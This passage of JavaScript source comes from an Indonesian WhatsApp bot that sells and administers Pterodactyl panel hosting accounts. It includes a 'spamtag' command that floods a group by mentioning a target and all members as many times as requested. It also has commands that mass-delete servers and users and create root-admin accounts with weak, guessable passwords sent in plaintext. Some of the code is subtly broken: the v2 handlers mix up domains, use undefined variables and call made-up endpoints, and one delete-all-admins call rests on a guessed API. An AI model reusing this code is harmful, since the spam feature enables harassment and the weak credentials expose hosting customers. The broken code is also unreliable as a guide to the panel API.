if ('saweria' in db.users[m.sender]) {
await dwiaff.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await dwiaff.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

case "spamtag": case "tag": {
    if (!m.isGroup) return reply(mess.group);
    if (!isCreator && !m.isAdmin) return m.reply(mess.admin);

    if (!text) return m.reply(example("tag|jumlah spam"));

    // Split the input to get the tag/user and the number of spams
    const args = text.split("|");
    const tag = args[0]; // @tag or user number
    const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default to 1 if no count is given

    if (isNaN(spamCount) || spamCount < 1) {
        return m.reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
    }

    // If the mentioned user is not valid, handle error
    let input = m.mentionedJid[0] ? m.mentionedJid[0] : tag ? tag.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

    if (!input) return m.reply("Tag atau nomor yang valid harus diberikan.");

    let member = m.metadata.participants.map(v => v.id); // list of group members
    
    // Spam tag the user as many times as specified
    for (let i = 0; i < spamCount; i++) {
        await dwiaff.sendMessage(m.chat, { text: text, mentions: [input, ...member] }, { quoted: m });
    }
    
    await m.reply(`Berhasil spam tag ${spamCount} kali!`);
}
break;

case "ht": case "hidetag": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await dwiaff.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break
/*==============================================*/
case "listseller": {
if (!isCreator) return reply(mess.owner)
if (reseller.length < 1) return m.reply("Tidak Ada Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
dwiaff.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtext})
}
break

case "listown": case "listowner": {
if (!isCreator) return reply(mess.owner)
if (owners.length < 1) return m.reply("Tidak Ada Owner Bot Tambahan")
let teksnya = ` LIST OWNER BOT ⚡\n\n`
owners.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
dwiaff.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break

case "listprem": {
    if (!isCreator) return reply(mess.owner)
    if (premium.length === 0) {
        return m.reply("Tidak ada pengguna yang terdaftar sebagai Premium!");
    } else {
        let list = "Daftar Pengguna Premium:\n\n";
        premium.forEach((user, index) => {
            list += `${index + 1}. ${user.split('@')[0]}\n`;
        });
        m.reply(list);
    }
}
break;
/*==============================================*/
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isCreator) return reply(mess.owner)  
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Status : *${status}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await dwiaff.sendMessage(m.chat, { text: messageText }, { quoted: qtext })
}
break

case "listpanel-v2": case "listp-v2": case "listserver-v2": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isCreator) return reply(mess.owner) 
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Status : *${status}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await dwiaff.sendMessage(m.chat, { text: messageText }, { quoted: qtext })
}
break

case 'linklog': {
if (!isCreator) return reply(mess.owner)
let dwiaff002 = `*halo @$${pushname} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN*
${domain}

 Powered By dwiaff
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(dwiaff002)
}
break

case 'linklog-v2': {
if (!isCreator) return reply(mess.owner)
let dwiaff003 = `*halo @$${pushname} 👋*

▭▬▭( *LINK LOGIN PANEL V2* )▭▬▭

*LINK LOGIN*
${domainV2}

 Powered By dwiaff
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(dwiaff003)
}
break
/*==============================================*/
case "listadmin": {
  if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await dwiaff.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break

case "listadmin-v2": {
  if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainV2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await dwiaff.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
/*==============================================*/
case "delpanel": case "hapuspanel": {
if (!isCreator) return reply(mess.owner) 
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case "delpanelall": case "hapuspanelall": {
  if (!isCreator) return reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!");

  // Parsing pengecualian dari perintah
  let args = m.body.split(" "); // Memisahkan argumen dari perintah
  args.shift(); // Menghapus perintah dari array argumen
  let excludedAccounts = args.length > 0 ? args : []; // ID akun yang dikecualikan (jika ada)

  m.reply(`Akun yang akan dikecualikan: ${excludedAccounts.length > 0 ? excludedAccounts.join(", ") : "Tidak ada"}`);

  // Fetch all servers
  let f = await fetch(domain + "/api/application/servers?page=1", {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let result = await f.json();
  let servers = result.data;

  // Delete all servers
  for (let server of servers) {
    let s = server.attributes;
    await fetch(domain + `/api/application/servers/${s.id}`, {
      "method": "DELETE",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey,
      }
    });
  }

  // Fetch all users
  let cek = await fetch(domain + "/api/application/users?page=1", {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res2 = await cek.json();
  let users = res2.data;

  // Delete all users except admins and excluded accounts
  for (let user of users) {
    let u = user.attributes;
    
    // Check if user is an admin or in the exclusion list
    if (u.role === "admin" || u.permissions.includes("admin") || excludedAccounts.includes(u.id)) {
      console.log(`Skipping user: ${u.username} (Role: ${u.role}, ID: ${u.id})`);
      continue;
    }
    
    // Delete non-admin and non-excluded user
    await fetch(domain + `/api/application/users/${u.id}`, {
      "method": "DELETE",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
      }
    });
  }

  reply(`Berhasil Menghapus Semua Akun Panel (kecuali admin dan akun dengan ID: ${excludedAccounts.join(", ")})`);
}
break;

case "delpanel-v2": case "hapuspanel-v2": {
if (!isCreator) return reply(mess.owner) 
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel-v2*"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case "delpanelallV2": case "hapuspanelallV2": {
  if (!isCreator) return reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!");

  // Parsing pengecualian dari perintah
  let args = m.body.split(" "); // Memisahkan argumen dari perintah
  args.shift(); // Menghapus perintah dari array argumen
  let excludedAccounts = args.length > 0 ? args : []; // ID akun yang dikecualikan (jika ada)

  m.reply(`Akun yang akan dikecualikan: ${excludedAccounts.length > 0 ? excludedAccounts.join(", ") : "Tidak ada"}`);

  // Fetch all servers
  let f = await fetch(domainV2 + "/api/application/servers?page=1", {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
    }
  });
  let result = await f.json();
  let servers = result.data;

  // Delete all servers
  for (let server of servers) {
    let s = server.attributes;
    await fetch(domainV2 + `/api/application/servers/${s.id}`, {
      "method": "DELETE",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikeyV2,
      }
    });
  }

  // Fetch all users
  let cek = await fetch(domainV2 + "/api/application/users?page=1", {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
    }
  });
  let res2 = await cek.json();
  let users = res2.data;

  // Delete all users except admins and excluded accounts
  for (let user of users) {
    let u = user.attributes;
    
    // Check if user is an admin or in the exclusion list
    if (u.role === "admin" || u.permissions.includes("admin") || excludedAccounts.includes(u.id)) {
      console.log(`Skipping user: ${u.username} (Role: ${u.role}, ID: ${u.id})`);
      continue;
    }
    
    // Delete non-admin and non-excluded user
    await fetch(domainV2 + `/api/application/users/${u.id}`, {
      "method": "DELETE",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikeyV2
      }
    });
  }

  reply(`Berhasil Menghapus Semua Akun Panel (kecuali admin dan akun dengan ID: ${excludedAccounts.join(", ")})`);
}
break;
/*==============================================*/
        case "deladmin": {
  if (!isCreator) return reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE ADMIN*')
}
        break
        
        case "deladminall": {
  if (!isCreator) return reply(mess.owner)
  
  // Assuming the endpoint "/api/application/users" can be used to delete all admins
  let f = await fetch(domain + "/api/application/users", {
    "method": "DELETE",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });

  let res = f.ok ? {
    errors: null
  } : await f.json();

  if (res.errors) return m.reply('*FAILED TO DELETE ADMINS*');
  
  m.reply('*SUCCESSFULLY DELETED ALL ADMIN ACCOUNTS*');
}
break;

case "deladminall-v2": {
  if (!isCreator) return reply(mess.owner)
  
  // Assuming the endpoint "/api/application/users" can be used to delete all admins
  let f = await fetch(domain + "/api/application/users", {
    "method": "DELETE",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
    }
  });

  let res = f.ok ? {
    errors: null
  } : await f.json();

  if (res.errors) return m.reply('*FAILED TO DELETE ADMINS*');
  
  m.reply('*SUCCESSFULLY DELETED ALL ADMIN ACCOUNTS*');
}
break;
        case "deladmin-v2": {
  if (!isCreator) return reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domainV2 + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE ADMIN*')
}
        break        
        
//==============================================
case "cadmin1": {
if (!isCreator) return reply(mess.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username+crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${nomornya}
`
    const listMessage = {
        text: tks,
    }
    await dwiaff.sendMessage(m.chat, listMessage)
    await dwiaff.sendMessage(nomornya, {
        text: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
📘 *Panduan:* ${linkytb}  
📱 *Sosmed:* ${sosmed}  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`,
})
} 
        break
//==============================================
case "c1gb": {
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c1gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c2gb": {
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
